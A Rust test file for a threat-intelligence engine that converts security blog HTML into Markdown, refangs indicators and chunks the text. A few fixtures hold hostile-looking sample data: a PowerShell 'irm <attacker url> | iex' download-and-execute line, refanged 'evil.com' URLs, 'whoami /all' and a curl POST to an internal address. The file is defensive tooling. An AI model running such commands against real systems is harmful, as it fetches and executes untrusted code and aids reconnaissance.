use super::*;

fn pad_n(n: usize) -> String {
    let tag: String = (0..4).map(|k| (b'a' + ((n / 3usize.pow(k)) % 3) as u8 + 3 * k as u8) as char).collect();
    format!("Ce paragraphe {tag} de remplissage décrit longuement le déroulement de l'intrusion observée sur l'hôte {tag}. ").repeat(2)
}

fn pad() -> String {
    pad_n(0)
}

/// Page d'un site fictif : en-tête et pied de page de gabarit autour de `body`.
fn page(body: &str) -> String {
    format!(
        "<html><head><title>t</title><script>var x = 1;</script></head><body>\
         <header><a href=\"/\">Accueil</a> <a href=\"/blog\">Blog</a> <a href=\"/about\">À propos</a></header>\
         <div class=\"wrap\"><article><h1>Titre</h1><p>{}</p>{body}</article></div>\
         <footer><p><a href=\"/privacy\">Confidentialité</a> <a href=\"/terms\">Conditions</a></p></footer></body></html>",
        pad()
    )
}

fn run(body: &str) -> String {
    CtiEngine::new().process_html(&page(body), None, Some("https://www.exemple.com/blog/x".into())).clean_markdown
}

#[test]
fn template_and_scripts_are_not_content() {
    let out = run("");
    assert!(out.starts_with("# Titre"), "{out}");
    assert!(!out.contains("Accueil") && !out.contains("Confidentialité") && !out.contains("var x"), "{out}");
}

#[test]
fn link_anchor_survives() {
    let out = run("<p>Le groupe <a href=\"https://attack.mitre.org/groups/G0000/\">Groupe Alpha</a> a déployé <a href=\"/produit\">Produit Beta</a> sur le réseau des victimes du secteur.</p>");
    assert!(out.contains("Le groupe Groupe Alpha a déployé Produit Beta sur le réseau"), "{out}");
}

#[test]
fn code_blocks_keep_layout_and_are_refanged_safely() {
    let out = run("<pre><code><span>[Parameter(Mandatory)] param($a)</span>\n$x = $a[0]  # [i] kept\nhxxp://evil[.]com/a</code></pre>");
    assert!(out.contains("```\n[Parameter(Mandatory)] param($a)\n$x = $a[0]  # [i] kept\nhttp://evil.com/a\n```"), "{out}");
}

#[test]
fn code_line_numbers_are_not_code() {
    let ln = |n: u8| format!("<span style=\"display:inline-block; user-select: none\">{n}</span>");
    let out = run(&format!("<pre><code><span>{}import os</span>\n<span>{}env = 1</span></code></pre>", ln(1), ln(2)));
    assert!(out.contains("```\nimport os\nenv = 1\n```"), "{out}");
}

#[test]
fn page_builder_shortcodes_are_removed_but_not_brackets() {
    let out = run("<p>[et_pb_text _builder_version=\"4.2\"]Contenu réel de l'article décrivant la charge utile, avec [Vendor] et [0] conservés.[/et_pb_text]</p>");
    assert!(out.contains("Contenu réel de l'article décrivant la charge utile, avec [Vendor] et [0] conservés."), "{out}");
    assert!(!out.contains("et_pb_text"), "{out}");
}

#[test]
fn card_titles_are_navigation() {
    let out = run(&format!("<p>{}</p><div><a href=\"/blog/autre\"><h4>Un autre article du site</h4></a><p>Son accroche résume en quelques mots une campagne différente de celle-ci.</p></div><h2><a href=\"#suite\">Suite</a></h2><p>{}</p>", pad_n(1), pad_n(2)));
    assert!(!out.contains("Un autre article du site"), "{out}");
    assert!(out.contains("## Suite"), "{out}");
}

#[test]
fn unescaped_placeholders_are_kept_as_written() {
    let out = run("<table><tr><th>Groupe</th><th>Extension</th></tr><tr><td>A</td><td>.[<victim_id>].[<email_addr>].CRYSTAL</td></tr></table><pre>irm <attacker url> | iex</pre>");
    assert!(out.contains(".[<victim_id>].[<email_addr>].CRYSTAL"), "{out}");
    assert!(out.contains("irm <attacker url> | iex"), "{out}");
}

#[test]
fn prose_is_refanged() {
    let out = run("<p>Le serveur hxxps[:]//bad[.]site/a répondait depuis 192[.]168[.]1[.]5 pendant toute la durée de la campagne.</p>");
    assert!(out.contains("https://bad.site/a") && out.contains("192.168.1.5"), "{out}");
}

#[test]
fn refang_variants() {
    let e = CtiEngine::new();
    assert_eq!(e.refang("hxxps[:]//bad[.]site/a"), "https://bad.site/a");
    assert_eq!(e.refang("hXXp://a(.)b"), "http://a.b");
    assert_eq!(e.refang("user[at]x[dot]com"), "user@x.com");
    assert_eq!(e.refang("llc-image-ico.]click et evil[.com"), "llc-image-ico.click et evil.com");
}

#[test]
fn tables_become_markdown_tables() {
    let out = run("<table><tr><th>Type</th><th>Valeur</th></tr><tr><td>IPv4</td><td>185.220.101.4</td></tr><tr><td>SHA-256</td><td>a|b</td></tr></table>");
    assert!(out.contains("| Type | Valeur |\n| --- | --- |\n| IPv4 | 185.220.101.4 |\n| SHA-256 | a\\|b |"), "{out}");
}

#[test]
fn layout_tables_are_not_tables() {
    let out = run(&format!("<table><tr><td><p>{}</p></td></tr></table>", pad_n(4)));
    assert!(!out.contains('|'), "{out}");
}

#[test]
fn lists_keep_items_and_nesting() {
    let out = run(&format!("<ul><li>Première étape de la chaîne</li><li>Deuxième étape<ul><li>sous-étape</li></ul></li></ul><ol><li>un</li><li>deux</li></ol><p>{}</p>", pad_n(6)));
    assert!(out.contains("- Première étape de la chaîne\n- Deuxième étape\n  - sous-étape"), "{out}");
    assert!(out.contains("1. un\n2. deux"), "{out}");
}

#[test]
fn internal_link_lists_are_navigation() {
    let out = run(&format!(
        "<h2>Conclusion</h2><p>{}</p><h2>Articles liés</h2><ul><li><a href=\"/blog/a\">Autre article A</a></li><li><a href=\"/blog/b\">Autre article B</a></li></ul>",
        pad_n(2)
    ));
    assert!(out.contains("Conclusion"), "{out}");
    assert!(!out.contains("Articles liés") && !out.contains("Autre article"), "{out}");
}

#[test]
fn ioc_anchors_are_content() {
    let out = run("<h2>Exploits</h2><ul><li><a href=\"/vuln?q=CVE-2023-0001\">CVE-2023-0001</a></li><li><a href=\"/vuln?q=CVE-2025-0002\">CVE-2025-0002</a></li></ul>");
    assert!(out.contains("CVE-2023-0001") && out.contains("CVE-2025-0002"), "{out}");
}

#[test]
fn article_titles_citing_a_cve_are_still_navigation() {
    let out = run(&format!("<p>{}</p><h3>Related Articles</h3><ul><li><a href=\"/blog/x\">Active Exploitation of Product CVE-2026-0001 (Updated May 2)</a></li><li><a href=\"/blog/y\">Threat Brief: Post-Exploitation Activity Related to CVE-2024-0002</a></li></ul><h2>Ressources</h2><p>{}</p>", pad_n(1), pad_n(2)));
    assert!(!out.contains("CVE-2026-0001") && !out.contains("Related Articles"), "{out}");
}

#[test]
fn external_reference_lists_are_content() {
    let out = run(&format!("<h2>Références</h2><ul><li><a href=\"https://autre.org/rapport\">Rapport d'un tiers sur la campagne</a></li></ul><p>{}</p>", pad_n(5)));
    assert!(out.contains("Rapport d'un tiers"), "{out}");
}

#[test]
fn hash_urls_are_kept_next_to_their_anchor() {
    let h = "2f4a8d3c9b1e7f6a5d4c3b2a190877662f4a8d3c9b1e7f6a5d4c3b2a19087766";
    let out = run(&format!("<p>L'échantillon <a href=\"https://sandbox.org/file/{h}\">analysé ici</a> communique avec son serveur de commande.</p>"));
    assert!(out.contains(&format!("analysé ici (https://sandbox.org/file/{h})")), "{out}");
}

#[test]
fn hidden_elements_are_dropped() {
    let out = run("<div hidden>Contenu caché du menu mobile</div><div aria-hidden=\"true\">Carrousel décoratif</div><p style=\"display: none\">Texte masqué</p>");
    assert!(!out.contains("caché") && !out.contains("Carrousel") && !out.contains("masqué"), "{out}");
}

#[test]
fn react_streamed_content_takes_its_place() {
    let body = format!(
        "<p>{}</p><!--$?--><template id=\"B:0\"></template><p>Chargement…</p><!--/$--><p>{}</p>",
        pad_n(1),
        pad_n(2)
    );
    let html = page(&body).replace("</body>", "<div hidden id=\"S:0\"><pre><code>whoami /all</code></pre></div></body>");
    let out = CtiEngine::new().process_html(&html, None, None).clean_markdown;
    let (a, code, b) = (out.find(&pad_n(1)[..30]).unwrap(), out.find("whoami /all").expect("code"), out.find(&pad_n(2)[..30]).unwrap());
    assert!(a < code && code < b, "{out}");
    assert!(!out.contains("Chargement"), "{out}");
}

#[test]
fn bold_only_paragraphs_become_subheadings() {
    let html = page(&format!("<h2>Chaîne d'attaque</h2><p><strong>Step 2 – Persistance</strong></p><p>{}</p><p><b>Cette phrase en gras se termine par un point.</b></p><p>{}</p>", pad_n(2), pad_n(3)));
    let r = CtiEngine::new().process_html(&html, None, None);
    let paths: Vec<_> = r.sections.iter().map(|s| s.heading_path.as_str()).collect();
    assert!(paths.contains(&"Titre > Chaîne d'attaque > Step 2 – Persistance"), "{paths:?}");
    assert!(r.clean_markdown.contains("Cette phrase en gras se termine par un point."), "{}", r.clean_markdown);
}

#[test]
fn byline_and_date_are_dropped_in_header() {
    let html = page("").replace("<h1>Titre</h1>", "<h1>Titre</h1><p>By: Jane Analyst 2026/07/24</p><p>May 26, 2026</p>");
    let out = CtiEngine::new().process_html(&html, None, None).clean_markdown;
    assert!(!out.contains("Jane Analyst") && !out.contains("May 26"), "{out}");
}

#[test]
fn learned_template_keys_are_removed() {
    let e = CtiEngine::new();
    let pages: Vec<String> = (0..6)
        .map(|i| page(&format!("<p>{}</p><p>Subscribe to our weekly threat digest today</p>", pad_n(i + 1))))
        .collect();
    let keys: Vec<Vec<String>> = pages.iter().map(|p| e.html_template_keys(p)).collect();
    // Un même encart inséré à une autre profondeur est le même gabarit.
    assert!(e.html_template_keys(&page("<div><section><p>Subscribe to our weekly threat digest today</p></section></div>")).iter().any(|k| k.contains("weekly threat digest")));
    let common: Vec<String> = keys[0].iter().filter(|k| keys.iter().all(|ks| ks.contains(k))).cloned().collect();
    assert!(common.iter().any(|k| k.contains("weekly threat digest")), "{common:?}");
    assert!(common.iter().all(|k| !k.contains("titre")), "les titres ne sont jamais du gabarit : {common:?}");
    let out = e.process_html(&pages[0], Some(common), None).clean_markdown;
    assert!(!out.contains("weekly threat digest"), "{out}");
    assert!(out.contains("intrusion"), "{out}");
}

#[test]
fn technical_blocks_are_never_template() {
    let e = CtiEngine::new();
    let html = page("<p>\"jitter\": 20,</p><p>185.220.101.4 2f4a8d3c9b1e7f6a5d4c3b2a19087766</p><p><strong>Network indicators</strong></p><pre>whoami</pre>");
    let keys = e.html_template_keys(&html);
    assert!(keys.iter().all(|k| !k.contains("jitter") && !k.contains("185.") && !k.contains("network") && !k.contains("whoami")), "{keys:?}");
}

#[test]
fn content_root_skips_sidebars_but_keeps_technical_siblings() {
    let html = format!(
        "<html><body><div><main><article><h1>T</h1><p>{}</p><p>{}</p><p>{}</p></article>\
         <section><h2>Indicateurs</h2><p>2f4a8d3c9b1e7f6a5d4c3b2a19087766</p></section></main>\
         <aside><p>Notre newsletter mensuelle sur les menaces</p></aside></div></body></html>",
        pad_n(1), pad_n(2), pad_n(3)
    );
    let out = CtiEngine::new().process_html(&html, None, None).clean_markdown;
    assert!(out.contains("2f4a8d3c9b1e7f6a5d4c3b2a19087766"), "{out}");
    assert!(!out.contains("newsletter"), "{out}");
}

#[test]
fn article_split_across_sibling_containers_is_kept() {
    let intro = "Nous avons découvert une nouvelle famille de voleurs d'informations distribuée par des dépôts publics piégés.";
    let html = format!(
        "<html><body><main><div class=\"rich\"><p>{intro}</p></div><div class=\"rich\"><h2>Analyse</h2><p>{}</p><p>{}</p><p>{}</p><p>{}</p></div></main></body></html>",
        pad_n(1), pad_n(2), pad_n(3), pad_n(4)
    );
    let out = CtiEngine::new().process_html(&html, None, None).clean_markdown;
    assert!(out.contains(intro), "{out}");
}

#[test]
fn indented_code_is_atomic_and_never_a_heading() {
    let md = format!("Voici la sortie :\n\n    ## Observations: 1\n    curl -i -k https://172.30.132.194:9251/x -X POST\n\n{}", pad());
    let kinds: Vec<String> = CtiEngine::new().split_blocks(&md).into_iter().map(|b| b.kind).collect();
    assert_eq!(kinds, vec!["text", "code", "text"], "{md}");
}

#[test]
fn code_heavy_report_keeps_its_indented_code() {
    // Plus de 60 % des lignes sont indentées (une règle YARA), mais la prose est à la marge : le code reste du code.
    let rule = (0..30).map(|i| format!("          $s{i} = \"chaine{i}\" fullword ascii")).collect::<Vec<_>>().join("\n");
    let text = format!("## YARA\n\nLes règles suivantes détectent les fichiers déposés par l'opérateur lors de l'intrusion.\n\n    rule demo {{\n       strings:\n{rule}\n       condition:\n          all of them\n    }}\n");
    let kinds: Vec<String> = CtiEngine::new().split_blocks(&text).into_iter().map(|b| b.kind).collect();
    assert_eq!(kinds, vec!["heading", "text", "code"], "{text}");
}

#[test]
fn sections_expose_atomic_blocks() {
    let r = CtiEngine::new().process_html(&page("<pre>a\n\nb</pre>"), None, None);
    let blocks = &r.sections[0].blocks;
    assert_eq!(blocks.len(), 2, "{blocks:?}");
    assert!(blocks[1].starts_with("```") && blocks[1].contains("a\n\nb"));
}

#[test]
fn chunks_never_split_code_or_orphan_a_heading() {
    let e = CtiEngine::new();
    let code = format!("```\n{}\n\n{}\n```", "x".repeat(300), "y".repeat(300));
    let md = format!("# T\n\n{}\n\n## Étape\n\n{}\n\n## Fin\n\n{}", pad_n(1), code, pad_n(2));
    let chunks = e.chunk_markdown(&md, 700);
    assert!(chunks.len() >= 2, "{chunks:?}");
    for c in &chunks {
        assert_eq!(c.text.matches("```").count() % 2, 0, "bloc de code coupé : {}", c.text);
        assert!(!c.text.trim_end().ends_with("## Fin") && !c.text.trim_end().ends_with("## Étape"), "titre orphelin : {}", c.text);
    }
    let rebuilt: String = chunks.iter().map(|c| c.text.clone()).collect::<Vec<_>>().join("\n\n");
    assert_eq!(rebuilt, md, "le découpage doit être sans perte ni duplication");
    assert!(chunks.iter().any(|c| c.heading_path == "T > Étape"), "{:?}", chunks.iter().map(|c| &c.heading_path).collect::<Vec<_>>());
}

#[test]
fn split_blocks_keeps_order_kinds_and_heading_paths() {
    let md = format!("# T\n\n{}\n\n## A\n\n```\nx\n\ny\n```\n\n| a | b |\n| - | - |\n\n### B\n\n{}", pad_n(1), pad_n(2));
    let blocks = CtiEngine::new().split_blocks(&md);
    let shape: Vec<_> = blocks.iter().map(|b| (b.kind.as_str(), b.heading_path.as_str())).collect();
    assert_eq!(
        shape,
        vec![("heading", "T"), ("text", "T"), ("heading", "T > A"), ("code", "T > A"), ("table", "T > A"), ("heading", "T > A > B"), ("text", "T > A > B")]
    );
    assert!(blocks[3].text.contains("x\n\ny"));
}

#[test]
fn fast_reject() {
    let e = CtiEngine::new();
    assert!(!e.check_viability("").0);
    assert!(!e.check_viability("trop court").0);
    let err = format!("Access Denied {}", "x ".repeat(150));
    assert!(!e.check_viability(&err).0);
    assert!(e.check_viability(&pad()).0);
    let shell = "<html><body><div id=\"root\"></div><script>app()</script></body></html>";
    assert!(!e.process_html(shell, None, None).is_processable);
}

#[test]
fn sections_are_indexed_in_order() {
    let r = CtiEngine::new().process_html(&page(&format!("<h2>A</h2><p>{}</p><h3>B</h3><p>{}</p>", pad_n(2), pad_n(3))), None, None);
    let titles: Vec<_> = r.sections.iter().map(|s| (s.section_index, s.level, s.title.as_str())).collect();
    assert_eq!(titles, vec![(0, 1, "Titre"), (1, 2, "A"), (2, 3, "B")]);
}
